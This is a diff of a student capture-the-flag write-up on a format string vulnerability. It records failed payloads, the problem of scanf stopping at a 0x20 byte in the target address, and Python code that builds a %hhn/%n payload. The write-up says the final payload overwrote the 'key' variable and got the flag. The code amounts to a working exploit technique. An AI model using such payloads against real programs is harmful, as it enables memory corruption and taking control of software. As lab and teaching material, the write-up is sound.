@@ -96,7 +96,7 @@ the 4 bytes for the address of the variable "key"
 
 "0000<addr>%48871x%n"
 
-
+"ABCD<key_addr>%48871x%n"
 
 
 Since this was not working, we tried this input:
@@ -108,7 +108,68 @@ content[0: len(fmt)] = fmt
 
 It resulted in this output
 You gave me this:ABCD4443424178257825782578257825782578257825000
-It shows that the first %x reads the "ABCD", as we expected
+It shows that the first %x reads the "ABCD", as we expected, the rest is just reading the "%x"
 
+Not understanding how this works, we tested several other things. We came to the conclusion that the address of the variable had the value 0x20, which represents a space. The problem is that scanf stops reading after receiving a space, so our input did not get fully sent.
+
+
+
+SO THE SOLUTION WE CAME UP FOR THIS WAS:
+writing the value of the address of the variable key (which had a space on it) by using %n and not directly through the input
+
+In task 3.C of the guide of format string vulnerabilities, it is referenced that we can use %hn to modify a one byte memory space. We can use this to change the value of the address of the variable key.
+So instead of inputting the exact value of the address, we replace 0x20 by, for example, 0xff, and then overwrite it using %hn with the correct value 0x20.
+
+But for this, we need to pass the exact address of the byte that we want to change. The address of the buffer is 0xffffd160 so we can pass that on the input. Since we need to pass the exact address of the byte, we can calculate it.
+
+
+Notes
+address of buffer: 0xffffd160
+2^16 = 65536
+
+payload:
+ABCD<buffer_addr - x><key_addr w/o 0x20>
 
 -->
+```python
+content = bytearray(0x0 for i in range(N))
+
+content[0:4] = ("ABCD").encode('latin-1')
+
+inside_buffer = 0xffffd160 + 8
+
+content[4:8] = (inside_buffer).to_bytes(4,byteorder='little')
+content[8:12] = ("ABCD").encode('latin-1')
+
+key_addr = 0x0804b3ff	# 0x20 is replaced by 0xff
+content[12:16] = (key_addr).to_bytes(4,byteorder='little')
+
+s = "%496x%hhn%48367x%n"
+
+fmt  = (s).encode('latin-1')
+content[16:16 + len(fmt)] = fmt
+```
+Above is a try to make the address of the variable key be changed to 0x20 and be able to write the value 48879 in it.
+Does not work because the content would have 34 bytes.
+
+In order to reduce the size, we tried doing this:
+
+```python
+N = 32	# 32 bytes read in total
+content = bytearray(0x0 for i in range(N))
+
+content[0:4] = ("ABCD").encode('latin-1')
+
+inside_buffer = 0xffffd1c0 + 8
+content[4:8] = (inside_buffer).to_bytes(4,byteorder='little')
+
+key_addr = 0x0804b3ff	# 0x20 is replaced by 0xff
+content[8:12] = (key_addr).to_bytes(4,byteorder='little')
+
+s = "%20x%hhn%1$48847x%n"
+
+fmt  = (s).encode('latin-1')
+content[12:12 + len(fmt)] = fmt
+```
+
+After a few minor oopsies in the code, we managed to get the flag with this code.
